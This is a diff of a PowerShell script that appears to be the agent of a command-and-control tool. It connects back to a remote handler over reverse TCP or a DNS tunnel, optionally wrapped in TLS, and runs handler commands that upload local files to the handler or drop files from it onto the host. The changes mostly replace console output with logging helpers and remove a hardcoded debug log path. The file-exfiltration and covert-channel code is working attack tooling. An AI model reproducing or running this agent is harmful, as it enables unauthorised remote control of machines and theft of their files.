@@ -1,5 +1,4 @@
 
-
 function Handle-Message([PSObject] $transport, [PSObject] $msg) {
     if ($msg.channelnumber -eq $MESSAGE_CHANNEL_COMMAND) {
         if ($msg.mtype -eq $MESSAGE_TYPE_COMMAND) {
@@ -7,11 +6,11 @@ function Handle-Message([PSObject] $transport, [PSObject] $msg) {
             return $false
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_MESSAGE) {
             $text = New-Object String($msg.content, 0, $msg.leng)
-            Write-Host '[+] HANDLER:' $text
+            Print-Message "HANDLER: $($text)"
             return $true
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_ERRORMESSAGE) {
             $text = New-Object String($msg.content, 0, $msg.leng)
-            Write-Host '[-] ERROR: HANDLER:' $text
+            Print-Error "HANDLER: $($text)"
             return $true
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_DOWNLOADCOMMAND) {
             $downloadchannelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
@@ -30,17 +29,17 @@ function Handle-Message([PSObject] $transport, [PSObject] $msg) {
             $Runningthreads.Add($job)
             return $true
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
-            Write-Host '[-] ERROR: received close message from handler, exiting...'
+            Print-Error "received close message from handler, exiting..."
             Channel-setClosed $Channels[$MESSAGE_CHANNEL_COMMAND]
             return $true
         } else {
             # TODO: implement other types
-            Write-Host 'ERROR: message with invalid type received:' $msg.mtype
+            Print-Error "message with invalid type received: $($msg.mtype)"
             return $false
         }
     } else {
         if (! $Channels.ContainsKey($msg.channelnumber)) {
-            Write-Host 'ERROR: message with unknown channel number received, droping: ' $msg.channelnumber
+            Print-Error "message with unknown channel number ($($msg.channelnumber)) received, droping"
             return $false
         } elseif (Channel-isReserved $Channels[$msg.channelnumber]) {
             Channel-setOpen $Channels[$msg.channelnumber]
@@ -55,7 +54,7 @@ function Handle-Message([PSObject] $transport, [PSObject] $msg) {
         } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
             Channel-setClosed $Channels[$msg.channelnumber]
         } else {
-            Write-Host 'ERROR: received invalid command for channel:' $msg.mtype $msg.channelnumber
+            Print-Error "received invalid command for channel $($msg.channelnumber): $($msg.mtype)"
             return $false
         }
 
@@ -65,10 +64,10 @@ function Handle-Message([PSObject] $transport, [PSObject] $msg) {
 }
 
 function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSObject] $transport) {
-    Write-Host '[+] sending file to handler:' $filename '(channel:' $downloadchannelid ')'
+    Print-Message "sending file to handler: $($filename) (channel: $($downloadchannelid))"
 
     if ($Channels.ContainsKey($downloadchannelid)) {
-        Write-Host "ERROR: download channel id is already in use"
+        Print-Error "download channel id is already in use"
         return
     }
 
@@ -78,11 +77,11 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
 
     try {
         $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)
-        Write-Host "[+] file has" $fs.Length "bytes"
+        Print-Message "file has $($fs.Length) bytes"
         # TODO: send file size to handler
         $fs.Close()
     } catch {
-        Write-Host "ERROR: could not open file for reading"
+        Print-Error "could not open file for reading"
         # TODO: send error to handler!
         return
     }
@@ -90,8 +89,7 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
 
     $script = {
         param([string]$filename, [PSObject]$channel)
-        Write-Output $filename
-        Write-Output $channel
+        Print-Debug "ASYNC SendFile: filename = $($filename), channel = $($channel)"
 
         $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)
 
@@ -107,24 +105,19 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
             for($i=0; $i -lt $br; ++$i) {
                 $channel.sendqueue.Enqueue($buf[$i])
             }
-            Write-Output "wrote" $br "bytes"
+            Print-Debug "ASYNC SendFile: wrote $($br) bytes"
         }
         $reader.Close()
         #Channel-setClosed $channel # cannot call this function from job, hacking it
         $channel.state = "CLOSED"
-        Write-Output $channel.sendqueue.Count
+        Print-Debug "ASYNC SendFile: done and closed"
 
     }
 
     $p = [PowerShell]::Create()
-    $null = $p.AddScript($script).AddArgument($filename).AddArgument($Channels[$downloadchannelid])
+    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($filename).AddArgument($Channels[$downloadchannelid])
     $job = $p.BeginInvoke()
-    Write-Host "DEBUG: started backgroud write process"
-
-    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
-    #$done = $job.AsyncWaitHandle.WaitOne()
-    #$p.EndInvoke($job)
-    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
+    Print-Debug "started backgroud write process"
 
     return New-Object -TypeName PSObject -Property @{
        'shell' = $p
@@ -133,10 +126,10 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
 }
 
 function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject] $transport) {
-    Write-Host '[+] receiving file from handler:' $filename '(channel:' $channelid ')'
+    Print-Message "receiving file from handler: $($filename) (channel: $($channelid))"
 
     if ($Channels.ContainsKey($channelid)) {
-        Write-Host "[-] ERROR: upload channel id is already in use"
+        Print-Error "upload channel id is already in use"
         return
     }
 
@@ -147,7 +140,7 @@ function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject]
         $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)
         $fs.Close()
     } catch {
-        Write-Host "[-] ERROR: could not open file for writing"
+        Print-Error "could not open file for writing"
         # TODO: send error to handler!
         return
     }
@@ -155,27 +148,22 @@ function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject]
     $script = {
         param([string]$filename, [PSObject]$channel)
 
-        # TODO: change logging !!!
-        $Logfile = "c:\\Users\\fsteglich\\Desktop\\receivefile.log"
-
-        Add-content $Logfile -value "DEBUG: waiting for channel to open"
+        Print-Debug "ASYNC ReceiveFile: waiting for channel to open"
         while ($channel.state -eq "RESERVED") {}
-        Add-content $Logfile -value "DEBUG: channel opened"
+        Print-Debug "ASYNC ReceiveFile: channel opened"
 
         $fs = new-object IO.FileStream($filename, [IO.FileMode]::Create)
 
         $writer = new-object IO.BinaryWriter($fs)
         while ($true) {
-            Add-content $Logfile -value "DEBUG: waiting for data in channel"
+            Print-Debug "ASYNC ReceiveFile: waiting for data in channel"
             while (($channel.state -eq "OPEN") -and ($channel.receivequeue.Count -eq 0)) {
                 Start-Sleep -Milliseconds 100
-                Add-content $Logfile -value "DEBUG: state = $($channel.state), receivequeue.Count = $($channel.receivequeue.Count)"
             }
             if (($channel.state -eq "CLOSED") -and ($channel.receivequeue.Count -eq 0)) {
-                Add-content $Logfile -value "DEBUG: channel closed"
+                Print-Debug "ASYNC ReceiveFile: channel closed"
                 break
             }
-            Add-content $Logfile -value "DEBUG: data in channel"
 
             #Channel-Read $channel 1024 # cannot call this function from job, hacking it
             $readlen = 1024
@@ -188,17 +176,17 @@ function Command-ReceiveFile([UInt16] $channelid, [string] $filename, [PSObject]
             }
 
             $writer.Write($bytes, 0, $readlen)
-            Add-content $Logfile -value "DEBUG: wrote $($readlen) bytes"
+            Print-Debug "ASYNC ReceiveFile: copied $($readlen) bytes from channel"
         }
-        Add-content $Logfile -value "DEBUG: write done"
+        Print-Debug "ASYNC ReceiveFile: done"
         $writer.Close()
         $fs.Close()
     }
 
     $p = [PowerShell]::Create()
-    $null = $p.AddScript($script).AddArgument($filename).AddArgument($Channels[$channelid])
+    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($filename).AddArgument($Channels[$channelid])
     $job = $p.BeginInvoke()
-    Write-Host "DEBUG: started backgroud read process"
+    Print-Debug "started backgroud read process"
 
     #$done = $job.AsyncWaitHandle.WaitOne()
     #$p.EndInvoke($job)
@@ -229,11 +217,13 @@ function ReceiveHeader-Async-Start([PSObject] $transport) {
 		        } elseif ($channelencryption -eq "TLS") {
 		            $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
 		        } else {
-		            # ERROR with invalid $channelencryption for DNS
+		            Print-Debug "ASYNC ReceiveHeader: ERROR with invalid channelencryption for DNS"
+		            # TODO: report as error instead
 		            return $NULL
 		        }
 		    } else {
-		        # ERROR with invalid $connectionmethod
+		        Print-Debug "ASYNC ReceiveHeader: ERROR with invalid connectionmethod"
+		        # TODO: report as error instead
 		        return $NULL
 		    }
 	    }
@@ -242,14 +232,9 @@ function ReceiveHeader-Async-Start([PSObject] $transport) {
     }
 
     $p = [PowerShell]::Create()
-    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($initialtransport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
+    $null = $p.AddScript($ADDTOSCRIPTS).AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($initialtransport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
     $job = $p.BeginInvoke()
-    Write-Host "DEBUG: started background receive header process"
-
-    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
-    #$done = $job.AsyncWaitHandle.WaitOne()
-    #$p.EndInvoke($job)
-    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
+    Print-Debug "started background receive header process"
 
     return New-Object -TypeName PSObject -Property @{
        'shell' = $p
@@ -266,7 +251,7 @@ function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {
 
 function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {
 
-    Write-Host "DEBUG: ended background receive header process"
+    Print-Debug "ended background receive header process"
     $res = $asyncobj.shell.EndInvoke($asyncobj.job)
     $asyncobj.shell.Dispose()
     return $res
@@ -298,12 +283,12 @@ if ($CONNECTIONMETHOD -eq "REVERSETCP") {
 } elseif ($CONNECTIONMETHOD -eq "DNS") {
     $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
 } else {
-    Write-Output "ERROR: connection method not defined"
+    Print-Error "connection method not defined"
     Exit(1)
 }
 
 if ($CHANNELENCRYPTION -eq "NONE") {
-    Write-Output "Warning: CONNECTION UNENCRYPTED"
+    Print-Message "Warning: CONNECTION UNENCRYPTED"
     $transport = $initialtransport
 } elseif ($CHANNELENCRYPTION -eq "TLS") {
     if ($CONNECTIONMETHOD -eq "REVERSETCP") {
@@ -313,7 +298,7 @@ if ($CHANNELENCRYPTION -eq "NONE") {
     }
     $transport = Transport-Tls-Open $stream $servercertfp
 } else {
-    Write-Output "ERROR: wrapper method not defined"
+    Print-Error "wrapper method not defined"
     Exit(1)
 }
 
@@ -326,14 +311,14 @@ Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]
 #$res = Message-ParseFromTransport $transport
 #$res = Handle-Message $transport $res
 
-#Write-Host "DEBUG: sending hello to handler"
+#Print-Debug "sending hello to handler"
 
 # send hello message to handler
 $text = [System.Text.Encoding]::UTF8.GetBytes("Hello from Agent")
 $message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_CHANNEL_COMMAND -Content $text
 Message-SendToTransport $message1 $transport
 
-#Write-Host "DEBUG: send hello to handler"
+#Print-Debug "send hello to handler"
 
 # try to read message headers in the background
 $asyncobj = ReceiveHeader-Async-Start $transport
@@ -345,9 +330,9 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     while ( ReceiveHeader-Async-IsDone $asyncobj ) {
         # receive result of the async job
         $messageheaders = ReceiveHeader-Async-GetResult $asyncobj
-        Write-Host "DEBUG: messageheaders =" $messageheaders
+        Print-Debug "messageheaders =" $messageheaders
         if ($CONNECTIONMETHOD -eq "DNS") {
-            Write-Host "DEBUG: next request-number =" $initialtransport.requestid
+            Print-Debug "next request-number =" $initialtransport.requestid
         }
 
 
@@ -372,13 +357,13 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
             continue  # the command channel is different still
         }
         if (Channel-HasDataToSend($Channels[$chanid])) {
-            Write-Host "DEBUG: sending data"
+            Print-Debug "sending data"
             $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
             $msg = Message-Create -MType $MESSAGE_TYPE_DATA -ChannelNumber $chanid -Content $data
             Message-SendToTransport $msg $transport
             $hassended = $true
         } elseif (Channel-isClosed($Channels[$chanid])) {
-            Write-Host "DEBUG: sending EOC"
+            Print-Debug "sending EOC"
             $msg = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $chanid -Content $MESSAGE_EMPTY_CONTENT
             Message-SendToTransport $msg $transport
             $hassended = $true
@@ -393,7 +378,7 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
 
     # if we must poll, always send at least one package
     if ((!$hassended) -and ($CONNECTIONMETHOD -eq "DNS")) {
-        Write-Host "DEBUG: sending a polling NODATA message to handler"
+        Print-Debug "sending a polling NODATA message to handler"
         $initialtransport.stream.Write($NULL, 0, 0);
     }
 
@@ -403,15 +388,16 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
 } finally {
 
 # stop async refresh
-Write-Host "DEBUG: stoping background message reading"
+Print-Debug "stoping background message reading"
 $asyncobj.shell.Dispose()
 
 # terminate all jobs on exit
-Write-Host "DEBUG: stoping background jobs"
+Print-Debug "stoping background jobs"
 foreach($t in $Runningthreads) {
     #if ($t.job.IsCompleted) {
     #    $t.shell.EndInvoke($t.job)
     #}
+    # TODO: if jobs have opened files, consider closing them here
     $t.shell.Dispose()
 }
 
